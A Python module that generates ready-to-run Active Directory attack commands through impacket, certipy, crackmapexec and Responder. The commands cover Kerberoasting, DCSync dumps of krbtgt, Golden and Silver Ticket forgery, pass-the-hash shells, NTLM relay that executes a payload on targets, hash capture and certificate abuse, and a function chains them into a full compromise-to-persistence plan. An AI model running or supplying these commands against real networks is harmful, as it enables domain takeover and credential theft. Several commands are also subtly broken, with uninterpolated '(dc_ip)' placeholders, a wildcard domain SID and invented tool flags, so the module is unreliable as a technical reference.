"""
Active Directory Attacks Module
Generates real impacket/bloodhound/crackmapexec commands for AD pentest engagements.
All commands target a Kali container (kali-as) with pre-installed tooling.
"""

from __future__ import annotations

import json
import shlex
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional


# ---------------------------------------------------------------------------
# Return type
# ---------------------------------------------------------------------------

@dataclass
class AttackCommand:
    """Standardised return value for every attack method."""
    command: str
    description: str
    risk_level: str            # low | medium | high | critical
    docker_required: bool
    tool: str = ""
    pre_conditions: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "command": self.command,
            "description": self.description,
            "risk_level": self.risk_level,
            "docker_required": self.docker_required,
            "tool": self.tool,
            "pre_conditions": self.pre_conditions,
            "notes": self.notes,
        }


# ---------------------------------------------------------------------------
# Helper: wrap a command inside docker exec
# ---------------------------------------------------------------------------

def _docker_exec(cmd: str, container: str = "kali-as") -> str:
    """Wrap an arbitrary command string so it runs inside the Kali container."""
    escaped = cmd.replace('"', '\\"')
    return f'docker exec {container} bash -c "{escaped}"'


def _verify_dict(result: AttackCommand) -> Dict[str, Any]:
    """Ensure the result is serialisable to dict."""
    return result.to_dict()


# ===========================================================================
# ActiveDirectoryAttacks – top-level attack catalogue
# ===========================================================================

class ActiveDirectoryAttacks:
    """Generate offensive AD commands backed by impacket / bloodhound / cme."""

    # ------------------------------------------------------------------
    # Kerberoasting
    # ------------------------------------------------------------------
    @staticmethod
    def kerberoasting(domain: str, dc_ip: str) -> Dict[str, Any]:
        """
        Request TGS tickets for all service accounts and extract hashes
        for offline cracking (hashcat / john).
        """
        user_part = shlex.quote(f"administrator@{domain}")
        cmd = (
            f"impacket-GetUserSPNs {domain}/{user_part} "
            f"-dc-ip {dc_ip} -request"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "Kerberoast: request TGS for every service principal name and "
                "dump offline-crackable NTLM hashes."
            ),
            risk_level="high",
            docker_required=True,
            tool="impacket-GetUserSPNs",
            pre_conditions=[
                "Valid domain user credentials (any account with SPN read rights)",
                "Network route to the domain controller",
            ],
            notes=[
                "Output TGS hashes can be cracked with hashcat mode 13100.",
                "Use -usersfile to target specific accounts and reduce noise.",
                "Kerberoasting with RC4 downgrade is common when AES is not enforced.",
            ],
        ))

    # ------------------------------------------------------------------
    # AS-REP Roasting
    # ------------------------------------------------------------------
    @staticmethod
    def as_reproasting(domain: str, dc_ip: str) -> Dict[str, Any]:
        """
        Find and roast accounts with DONT_REQUIRE_PREAUTH set.
        """
        user_part = shlex.quote(f"administrator@{domain}")
        cmd = (
            f"impacket-GetNPUsers {domain}/{user_part} "
            f"-dc-ip {dc_ip} -usersfile /tmp/asreproast_users.txt -format hashcat -outputfile /tmp/asreproast_hashes.txt"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "AS-REP Roast: extract hashes for accounts that do not require "
                "Kerberos pre-authentication."
            ),
            risk_level="high",
            docker_required=True,
            tool="impacket-GetNPUsers",
            pre_conditions=[
                "List of usernames (accounts without pre-auth requirement)",
                "Network route to the DC",
            ],
            notes=[
                "Crack with hashcat mode 18200 (AS-REP).",
                "Accounts created via legacy methods often lack pre-auth.",
                "Pipe usernames from LDAP enumeration or bloodhound results.",
            ],
        ))

    # ------------------------------------------------------------------
    # DCSync
    # ------------------------------------------------------------------
    @staticmethod
    def dcsync(domain: str, user: str, password: str, dc_ip: str) -> Dict[str, Any]:
        """
        Replicate password data via MS-DRSR (DCSync) using an account with
        DS-Replication-Get-Changes / DS-Replication-Get-Changes-All rights.
        """
        cmd = (
            f"impacket-secretsdump "
            f"{domain}/{user}:{password}@{dc_ip} -just-dc-user krbtgt"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "DCSync: abuse directory replication to extract all password "
                "hashes (or a targeted account like krbtgt) from a DC."
            ),
            risk_level="critical",
            docker_required=True,
            tool="impacket-secretsdump",
            pre_conditions=[
                "Account with DS-Replication-Get-Changes-All right",
                "Network access to the DC (DCOM or SMB)",
            ],
            notes=[
                "Extracting krbtgt hash enables Golden Ticket forgery.",
                "Requires replicating directory changes, which triggers event 4662.",
                "Use -just-dc to dump every account; -just-dc-ntlm skips cleartext.",
            ],
        ))

    # ------------------------------------------------------------------
    # Golden Ticket
    # ------------------------------------------------------------------
    @staticmethod
    def golden_ticket(domain: str, admin_ntlm_hash: str, dc_ip: str) -> Dict[str, Any]:
        """
        Forge a TGT using the krbtgt NTLM hash for unlimited domain access.
        """
        cmd = (
            f"impacket-ticketer "
            f"-nthash {admin_ntlm_hash} "
            f"-domain-sid S-1-5-21-* "
            f"-domain {domain} "
            f"-dc-ip {dc_ip} "
            f"Administrator"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "Golden Ticket: forge a TGT using the krbtgt NTLM hash, "
                "granting imperceptible domain-wide persistence."
            ),
            risk_level="critical",
            docker_required=True,
            tool="impacket-ticketer",
            pre_conditions=[
                "krbtgt NTLM hash (obtainable via DCSync or DC compromise)",
            ],
            notes=[
                "Set KRB5CCNAME=/tmp/krb5cc_administrator to use the forged ticket.",
                "Ticket lifetime defaults to 10 years; limit to 10 hours for stealth.",
                "Reset krbgt NTLM twice to invalidate golden tickets.",
            ],
        ))

    # ------------------------------------------------------------------
    # Silver Ticket
    # ------------------------------------------------------------------
    @staticmethod
    def silver_ticket(domain: str, service_ntlm_hash: str, target_spn: str) -> Dict[str, Any]:
        """
        Forge a TGS for a specific service using its NTLM hash.
        """
        cmd = (
            f"impacket-ticketer "
            f"-nthash {service_ntlm_hash} "
            f"-domain-sid S-1-5-21-* "
            f"-domain {domain} "
            f"-spn {target_spn} "
            f"-dc-ip (dc_ip) "
            f"Administrator"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "Silver Ticket: forge a TGS for a specific service (e.g. "
                "cifs/host, mssql/svc) using the service account's NTLM hash."
            ),
            risk_level="high",
            docker_required=True,
            tool="impacket-ticketer",
            pre_conditions=[
                "NTLM hash of the target service account",
                "Known SPN for the target service",
            ],
            notes=[
                "Silver tickets bypass KDC entirely – no DC traffic is generated.",
                "Target service must not validate PAC signatures.",
                "Common SPNs: cifs/FILE01, mssql/SQLEXP01, ldap/DC01.",
            ],
        ))

    # ------------------------------------------------------------------
    # Pass-the-Hash
    # ------------------------------------------------------------------
    @staticmethod
    def pass_the_hash(domain: str, user: str, ntlm_hash: str, target: str) -> Dict[str, Any]:
        """
        Authenticate to a remote host using an NTLM hash directly.
        """
        cmd = (
            f"impacket-psexec "
            f"{domain}/{user}@{target} "
            f"-hashes :{ntlm_hash} "
            f"-target-ip {target}"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "Pass-the-Hash: obtain a SYSTEM shell on a Windows host by "
                "authenticating with an NTLM hash via SMB / PsExec."
            ),
            risk_level="critical",
            docker_required=True,
            tool="impacket-psexec",
            pre_conditions=[
                "Valid NTLM hash for a local admin on the target",
                "SMB (445) open and accessible",
                "Account must have local admin privileges on target",
            ],
            notes=[
                "Alternatives: impacket-smbexec, impacket-wmiexec, impacket-atexec.",
                "Try crackmapexec for lateral movement across many hosts.",
                "Requires SMB signing to be disabled or the server to accept.",
            ],
        ))

    # ------------------------------------------------------------------
    # Overpass-the-Hash (Pass-the-Key)
    # ------------------------------------------------------------------
    @staticmethod
    def overpass_the_hash(domain: str, user: str, ntlm_hash: str, dc_ip: str) -> Dict[str, Any]:
        """
        Use an NTLM hash to request a Kerberos TGT, then use that ticket
        for Kerberos-authenticated access.
        """
        cmd = (
            f"impacket-getTGT "
            f"{domain}/{user} "
            f"-hashes :{ntlm_hash} "
            f"-dc-ip {dc_ip}"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "Overpass-the-Hash: convert an NTLM hash into a Kerberos TGT "
                "for Kerberos-aware lateral movement (no cleartext password)."
            ),
            risk_level="high",
            docker_required=True,
            tool="impacket-getTGT",
            pre_conditions=[
                "Valid NTLM hash for the target user",
                "Network access to the DC (Kerberos port 88)",
            ],
            notes=[
                "Set KRB5CCNAME to the exported ticket for subsequent tools.",
                "Use -aesKey for AES256 key instead of NTLM.",
                "Required for attacking services that enforce Kerberos auth.",
            ],
        ))

    # ------------------------------------------------------------------
    # GPO Abuse
    # ------------------------------------------------------------------
    @staticmethod
    def gpo_abuse(domain: str, dc_ip: str) -> Dict[str, Any]:
        """
        Abuse Group Policy Objects to push malicious scripts or scheduled
        tasks to domain-joined hosts.
        """
        cmd = (
            f"impacket-dcomexec {domain}/administrator@{dc_ip} "
            f"-object MMC20.Application "
            f"-share-name SYSVOL "
            f"-debug"
        )
        cmd2 = (
            f"# Alternative: SharpGPOAbuse via Cobalt Strike or direct .NET\n"
            f"# Upload malicious script to: \\\\{domain}\\SYSVOL\\{domain}\\Policies\\{{GPO-ID}}\\Machine\\Scripts\\"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "GPO Abuse: modify or create Group Policy Objects to execute "
                "code on every host affected by the GPO."
            ),
            risk_level="critical",
            docker_required=True,
            tool="impacket-dcomexec / SharpGPOAbuse",
            pre_conditions=[
                "Domain admin or GPO edit rights (Group Policy Creator Owners)",
                "Knowledge of target GPO GUID or host-to-GPO mapping",
            ],
            notes=[
                "Map hosts to GPOs with bloodhound: MATCH (g:GPO)-[:GpLink]->(o:OU)",
                "Check SYSVOL for GPO GUIDs: dir \\\\domain\\SYSVOL\\domain\\Policies\\",
                "Uses DCERPC / MMC20 COM object for remote execution.",
            ],
        ))

    # ------------------------------------------------------------------
    # Certificate Abuse (ESC1-ESC8)
    # ------------------------------------------------------------------
    @staticmethod
    def certificate_abuse(domain: str, ca_server: str) -> Dict[str, Any]:
        """
        Exploit misconfigured Active Directory Certificate Services (AD CS).
        Covers ESC1 (template impersonation), ESC8 (NTLM relay to HTTP enrollment).
        """
        cmd_enroll = (
            f"certipy find -u administrator@{domain} -p <password> "
            f"-dc-ip (dc_ip) -vulnerable -outfile /tmp/certipy_vuln.json"
        )
        cmd_esc1 = (
            f"certipy req -u administrator@{domain} -p <password> "
            f"-ca {ca_server} -template User "
            f"-upn krbtgt@{domain} -subject 'CN=krbtgt'"
        )
        cmd_esc8 = (
            f"# NTLM relay to HTTP enrollment endpoint:\n"
            f"impacket-ntlmrelayx -t http://{ca_server}/certsrv/certfnsh.asp "
            f"-smb2support -adcs -template VulnTemplate"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd_enroll),
            description=(
                "Certificate Abuse (AD CS): enumerate vulnerable templates, "
                "abuse ESC1 for impersonation or ESC8 for NTLM relay to "
                "enrollment endpoints."
            ),
            risk_level="critical",
            docker_required=True,
            tool="certipy / impacket-ntlmrelayx",
            pre_conditions=[
                "AD CS installed and accessible on the CA server",
                "Valid domain credentials",
            ],
            notes=[
                "certipy find -vulnerable identifies ESC1, ESC2, ESC4, ESC8.",
                "ESC1: template allows requester to specify SAN → impersonate anyone.",
                "ESC8: HTTP enrollment accepts NTLM → relay coerced auth.",
                "Forge a golden ticket from the stolen machine account cert.",
            ],
        ))

    # ------------------------------------------------------------------
    # BloodHound Collection
    # ------------------------------------------------------------------
    @staticmethod
    def bloodhound_collect(
        domain: str, user: str, password: str, dc_ip: str
    ) -> Dict[str, Any]:
        """
        Collect AD object data for BloodHound analysis.
        """
        cmd = (
            f"bloodhound-python -d {domain} -u {user} -p {password} "
            f"-dc {dc_ip} -c All "
            f"--zip /tmp/bh_collection_{domain}.zip"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "BloodHound Collection: enumerate AD objects (users, groups, "
                "computers, GPOs, sessions) and zip results for import."
            ),
            risk_level="medium",
            docker_required=True,
            tool="bloodhound-python",
            pre_conditions=[
                "Valid domain user credentials",
                "Network access to LDAP (389/636) and the DC",
            ],
            notes=[
                "Use -c Group membership for a fast initial pass.",
                "Use -c All for full enumeration (slower but comprehensive).",
                "Alternative: SharpHound on a domain-joined host for stealth.",
                "Upload the .zip to BloodHound CE or community edition.",
            ],
        ))

    # ------------------------------------------------------------------
    # BloodHound Analysis
    # ------------------------------------------------------------------
    @staticmethod
    def bloodhound_analyze(json_path: str) -> Dict[str, Any]:
        """
        Open BloodHound JSON collection for path analysis.
        Returns commands for Cypher queries and pathfinding.
        """
        cypher_queries = (
            "# Shortest path from owned principals to Domain Admin:\n"
            "MATCH (n:User {owned:true}) MATCH (m:User {admincount:true})\n"
            "MATCH p=shortestPath((n)-[r*1..]->(m)) RETURN p;\n\n"
            "# Find all Kerberoastable accounts:\n"
            "MATCH (u:User) WHERE u.hascrackablepassword = true\n"
            "RETURN u.name, u.admincount;\n\n"
            "# Find AS-REP roastable accounts:\n"
            "MATCH (u:User) WHERE u.dontreqpreauth = true\n"
            "RETURN u.name;\n\n"
            "# Find GPO links to OUs:\n"
            "MATCH (g:GPO)-[:GpLink]->(o:OU) RETURN g.name, o.name;\n\n"
            "# Find certificate template vulnerabilities:\n"
            "MATCH (ct:CertificateTemplate)-[:CanEnroll]->(u:User)\n"
            "WHERE ct.highvalue = true RETURN ct.name, u.name;"
        )
        cmd = (
            f"# Import {json_path} into BloodHound CE (Neo4j-backed)\n"
            f"# Then run these Cypher queries to find attack paths:\n\n"
            f"{cypher_queries}"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(f"echo '{json_path}' && echo 'Import into BloodHound CE'"),
            description=(
                "BloodHound Analysis: import collected data and run Cypher "
                "queries to map attack paths to Domain Admin."
            ),
            risk_level="low",
            docker_required=True,
            tool="BloodHound CE (Neo4j)",
            pre_conditions=[
                "BloodHound CE or community edition running",
                "Imported collection zip file",
            ],
            notes=[
                "BloodHound CE (v5+) uses Neo4j and a web UI.",
                "Use built-in 'Find Shortest Path to Domain Admin' first.",
                "Custom Cypher queries expose more granular paths.",
                "Precomputed stats in the UI identify highest-risk nodes.",
            ],
        ))

    # ------------------------------------------------------------------
    # LDAP Enumeration helper
    # ------------------------------------------------------------------
    @staticmethod
    def ldap_enum(domain: str, dc_ip: str, user: str, password: str) -> Dict[str, Any]:
        """
        Dump LDAP data for offline analysis (users, groups, SPNs, GPOs).
        """
        base_dn = "DC=" + ",DC=".join(domain.split("."))
        cmd = (
            f"ldapsearch -x -H ldap://{dc_ip} "
            f"-D '{user}@{domain}' -w '{password}' "
            f"-b '{base_dn}' "
            f"'(objectClass=*)' "
            f"> /tmp/ldap_dump_{domain}.ldif"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "LDAP Enumeration: full AD dump via ldapsearch for offline "
                "analysis of users, groups, SPNs, OUs, and GPO links."
            ),
            risk_level="medium",
            docker_required=True,
            tool="ldapsearch",
            pre_conditions=[
                "Valid domain user credentials",
                "LDAP access to the DC",
            ],
            notes=[
                "Use -ZZ for TLS; add -H ldaps:// for port 636.",
                "Pipe to grep for SPNs: grep servicePrincipalName ldap_dump.ldif",
                "Check for adminCount=1, dontReqPreAuth, and disabled accounts.",
            ],
        ))

    # ------------------------------------------------------------------
    # CrackMapExec lateral movement
    # ------------------------------------------------------------------
    @staticmethod
    def cme_lateral(
        domain: str, user: str, ntlm_hash: str, targets_file: str
    ) -> Dict[str, Any]:
        """
        Spray NTLM hashes across a list of hosts to find admin access.
        """
        cmd = (
            f"crackmapexec smb {targets_file} "
            f"-u {user} -H {ntlm_hash} "
            f"-d {domain} --local-auth"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "CrackMapExec: spray NTLM hashes across a target list to "
                "identify hosts where the credential grants admin access."
            ),
            risk_level="high",
            docker_required=True,
            tool="crackmapexec",
            pre_conditions=[
                "NTLM hash of a potentially reused credential",
                "File with target IPs/hostnames",
                "SMB (445) accessible on targets",
            ],
            notes=[
                "Remove --local-auth for domain authentication.",
                "Use --sam to dump local SAM hashes on success.",
                "Use --lsa to extract LSA secrets (cleartext passwords).",
                "Output file: --logfile /tmp/cme.log",
            ],
        ))


# ===========================================================================
# KerberosAttack – focused Kerberos exploitation techniques
# ===========================================================================

class KerberosAttack:
    """Lower-level Kerberos ticket manipulation and relay attacks."""

    @staticmethod
    def ticket_extract(
        domain: str, user: str, password: str, dc_ip: str
    ) -> Dict[str, Any]:
        """
        Request a TGT and extract the session key / ticket for offline use.
        """
        cmd = (
            f"impacket-getTGT {domain}/{user}:{password} "
            f"-dc-ip {dc_ip} -save -output /tmp/tgt_{user}.ccache"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "Ticket Extract: request a TGT via AS-REQ and save the "
                "resulting ccache for reuse without knowing the password."
            ),
            risk_level="medium",
            docker_required=True,
            tool="impacket-getTGT",
            pre_conditions=[
                "Valid domain credentials",
                "Kerberos (port 88) accessible on DC",
            ],
            notes=[
                "Set KRB5CCNAME=/tmp/tgt_{user}.ccache for subsequent tools.",
                "ccache tickets can be passed to pass-the-ticket attacks.",
                "Use -key to supply an AES/RC4 key instead of a password.",
            ],
        ))

    @staticmethod
    def ticket_relay(
        domain: str, target_spn: str, dc_ip: str
    ) -> Dict[str, Any]:
        """
        Unconstrained delegation relay: coerce NTLM auth from a host with
        unconstrained delegation and capture a usable TGT for that host.
        """
        cmd = (
            f"# Step 1: Start relay server\n"
            f"impacket-ntlmrelayx -t {target_spn} -smb2support -e /tmp/shell.exe\n\n"
            f"# Step 2: Coerce auth (PetitPotam / PrinterBug / SpoolSample)\n"
            f"python3 PetitPotam.py <coerce_target> <relay_listener>\n\n"
            f"# Step 3: Capture delegated TGT in KRB output"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(
                "impacket-ntlmrelayx -t ldap://dc01 -smb2support "
                "--capture"
            ),
            description=(
                "Ticket Relay: relay coerced NTLM authentication via PetitPotam "
                "or PrinterBug to capture a TGT for a host with unconstrained "
                "delegation."
            ),
            risk_level="critical",
            docker_required=True,
            tool="impacket-ntlmrelayx / PetitPotam",
            pre_conditions=[
                "Host with unconstrained delegation (U2U support)",
                "Ability to coerce NTLM auth (PetitPotam, PrinterBug)",
                "LDAP or SMB signing not enforced on relay target",
            ],
            notes=[
                "PetitPotam works against unpatched DCs (CVE-2021-36942).",
                "The captured TGT can be used for pass-the-ticket.",
                "Ensure your listener handles NTLM and Kerberos auth.",
            ],
        ))


# ===========================================================================
# NTLMAttack – NTLM-specific exploitation
# ===========================================================================

class NTLMAttack:
    """NTLM relay, hash capture, and pass-the-hash techniques."""

    @staticmethod
    def relay_attack(
        listener_ip: str, target: str, attack: str = "smb"
    ) -> Dict[str, Any]:
        """
        Set up an NTLM relay attack targeting SMB/LDAP/HTTP endpoints.
        """
        http_target = f"http://{target}/certsrv/certfnsh.asp" if attack == "http" else target
        cmd = (
            f"impacket-ntlmrelayx "
            f"-t {http_target} "
            f"-smb2support "
            f"-e /tmp/shell.exe "
            f"-l /tmp/relay_loot"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                f"NTLM Relay: relay captured NTLM authentication to {target} "
                f"({attack.upper()} mode) for code execution or credential theft."
            ),
            risk_level="critical",
            docker_required=True,
            tool="impacket-ntlmrelayx",
            pre_conditions=[
                "NTLM relay listener (IPv4/IPv6) accessible by victim",
                "SMB signing disabled or target accepts unsigned SMB",
                "Coercion method (PetitPotam, PrinterBug, SCShell)",
            ],
            notes=[
                "Use IPv6 coercion to bypass IPv4 SMB signing configurations.",
                "With AD CS HTTP target: use ESC8 to relay to cert enrollment.",
                "Add --adcs to auto-enroll a certificate via relay.",
                "For LDAP relay: use --ldap and --escalate-user for ACL abuse.",
            ],
        ))

    @staticmethod
    def capture_hash(
        listener_ip: str, port: int = 445, attack_type: str = "smb"
    ) -> Dict[str, Any]:
        """
        Start an NTLM hash capture listener (responder / ntlmrelayx).
        """
        cmd_responder = (
            f"responder -I eth0 -wrf -v"
        )
        cmd_ntlm = (
            f"impacket-ntlmrelayx -t smb://0.0.0.0 -smb2support "
            f"--serve-image /tmp/logo.ico -l /tmp/captured_hashes"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd_responder),
            description=(
                f"NTLM Hash Capture: listen on {attack_type.upper()} port {port} "
                f"and capture incoming NTLM authentication for offline cracking."
            ),
            risk_level="high",
            docker_required=True,
            tool="responder / impacket-ntlmrelayx",
            pre_conditions=[
                "Network access to the victim's broadcast/domain segment",
                "Responder interfaces configured correctly",
            ],
            notes=[
                "Responder captures NTLMv1/v2 hashes for offline cracking.",
                "Disable LLMNR/mDNS/NBT-NS in the environment as a defense.",
                "Use --wpad to serve a malicious WPAD for NTLM coercion.",
                "Capture files in /tmp are saved for hashcat cracking.",
            ],
        ))


# ===========================================================================
# CertificateAbuse – AD CS exploitation (ESC1-ESC8)
# ===========================================================================

class CertificateAbuse:
    """
    Exploit Active Directory Certificate Services misconfigurations.
    Based on the Certified Pre-Owned research (GhostPack / SpecterOps).
    """

    @staticmethod
    def find_enrollment_services(domain: str, dc_ip: str) -> Dict[str, Any]:
        """
        Enumerate certificate authorities and enrollment services,
        identifying vulnerable templates.
        """
        cmd = (
            f"certipy find "
            f"-u administrator@{domain} -p '<password>' "
            f"-dc-ip {dc_ip} "
            f"-vulnerable "
            f"-stdout -json"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                "Certificate Enumeration: discover all CA servers, enrollment "
                "endpoints, and flag vulnerable certificate templates "
                "(ESC1-ESC13)."
            ),
            risk_level="medium",
            docker_required=True,
            tool="certipy",
            pre_conditions=[
                "Valid domain credentials",
                "LDAP access to the DC",
                "AD CS installed in the target domain",
            ],
            notes=[
                "Look for: requiresManagerApproval=false, "
                "authorizedSignatures=0, requestType=cmc, "
                "enrolleeSuppliesSubject=true (ESC1).",
                "ESC8: HTTP endpoint at /certsrv/certfnsh.asp accepting NTLM.",
                "ESC4: template ACL allows low-priv users to modify template.",
                "ESC9: msPKI-Certificate-Name-Flag allows SAN injection.",
            ],
        ))

    @staticmethod
    def request_cert(
        domain: str, ca_server: str, template: str, upn: str = "Administrator"
    ) -> Dict[str, Any]:
        """
        Request a certificate for a privileged UPN (ESC1 impersonation).
        """
        cmd = (
            f"certipy req "
            f"-u administrator@{domain} -p '<password>' "
            f"-ca {ca_server} "
            f"-template {template} "
            f"-upn {upn}@{domain} "
            f"-subject 'CN={upn}' "
            f"-debug"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec(cmd),
            description=(
                f"Certificate Request (ESC1): request a certificate as "
                f"{upn} using a vulnerable template that allows SAN override."
            ),
            risk_level="critical",
            docker_required=True,
            tool="certipy",
            pre_conditions=[
                "Enrolled in a vulnerable template (ESC1: enrolleeSuppliesSubject)",
                "CA server name known",
                "Valid low-priv domain credentials for enrollment",
            ],
            notes=[
                "After cert issuance: certipy auth -pfx <cert.pfx> to get TGT.",
                "The TGT will be for the impersonated UPN (e.g. krbtgt, admin).",
                "Use certipy forge for resource-based constrained delegation.",
                "Templates to look for: User, UserAuthentication, LowPrivCorporate.",
            ],
        ))

    @staticmethod
    def shadow_credential(
        domain: str, target_user: str, ca_server: str
    ) -> Dict[str, Any]:
        """
        Abuse Shadow Credentials (msDS-KeyCredentialLink) to add a
        controlled key to a target account's KeyCredentialLink attribute,
        enabling certificate-based authentication.
        """
        cmd = (
            f"# Step 1: Add shadow credential\n"
            f"whisker add -u administrator@{domain} -p '<password>' "
            f"--target {target_user} --dc-ip (dc_ip)\n\n"
            f"# Step 2: Request cert using the added key\n"
            f"certipy auth -pfx /tmp/shadow_{target_user}.pfx "
            f"-dc-ip (dc_ip) -domain {domain}\n\n"
            f"# Step 3: Clean up the shadow credential\n"
            f"whisker remove -u administrator@{domain} -p '<password>' "
            f"--target {target_user} --dc-ip (dc_ip) --fingerprint <FP>"
        )
        return _verify_dict(AttackCommand(
            command=_docker_exec("whisker add --help"),
            description=(
                "Shadow Credential Abuse: manipulate msDS-KeyCredentialLink "
                "to add a controlled FIDO2 key, then authenticate via "
                "certificate without knowing the target's password."
            ),
            risk_level="critical",
            docker_required=True,
            tool="Whisker / Certipy",
            pre_conditions=[
                "Write permission to target's msDS-KeyCredentialLink attribute",
                "AD CS installed for cert-based auth",
                "Domain functional level: 2016+ (for KeyCredential support)",
            ],
            notes=[
                "Shadow Credentials work when any principal has write access.",
                "ACL-based delegation: GenericAll, WriteDACL, WriteOwner.",
                "Alternative: Certipy's 'shadow' module performs the same attack.",
                "Always clean up the shadow credential after use.",
            ],
        ))


# ===========================================================================
# Module-level helper: generate a full attack plan
# ===========================================================================

def generate_attack_plan(
    domain: str,
    dc_ip: str,
    ca_server: Optional[str] = None,
    user: Optional[str] = None,
    password: Optional[str] = None,
) -> List[Dict[str, Any]]:
    """
    Generate a prioritised attack plan from minimal recon info.
    Each entry is an AttackCommand dict ready for execution.
    """
    plan: List[Dict[str, Any]] = []

    # Phase 1: Enumeration
    plan.append(
        ActiveDirectoryAttacks.bloodhound_collect(
            domain=domain,
            user=user or "guest",
            password=password or "Password1!",
            dc_ip=dc_ip,
        )
    )
    plan.append(
        ActiveDirectoryAttacks.ldap_enum(
            domain=domain,
            dc_ip=dc_ip,
            user=user or "guest",
            password=password or "Password1!",
        )
    )

    # Phase 2: Credential Attacks
    plan.append(ActiveDirectoryAttacks.kerberoasting(domain, dc_ip))
    plan.append(ActiveDirectoryAttacks.as_reproasting(domain, dc_ip))

    # Phase 3: If we have creds, attempt DCSync and lateral movement
    if user and password:
        plan.append(ActiveDirectoryAttacks.dcsync(domain, user, password, dc_ip))

    # Phase 4: If a CA server is known, assess certificate abuse
    if ca_server:
        plan.append(ActiveDirectoryAttacks.certificate_abuse(domain, ca_server))
        plan.append(CertificateAbuse.find_enrollment_services(domain, dc_ip))

    # Phase 5: Persistence preparation
    plan.append(
        ActiveDirectoryAttacks.golden_ticket(domain, "<krbtgt_hash>", dc_ip)
    )

    return plan


# ---------------------------------------------------------------------------
# CLI entry-point for standalone testing
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("Usage: python ad_attacks.py <domain> <dc_ip> [ca_server]")
        print("Example: python ad_attacks.py corp.local 10.0.0.1")
        sys.exit(1)

    domain = sys.argv[1]
    dc_ip = sys.argv[2]
    ca = sys.argv[3] if len(sys.argv) > 3 else None

    attacks = generate_attack_plan(domain=domain, dc_ip=dc_ip, ca_server=ca)

    print(json.dumps(attacks, indent=2, default=str))
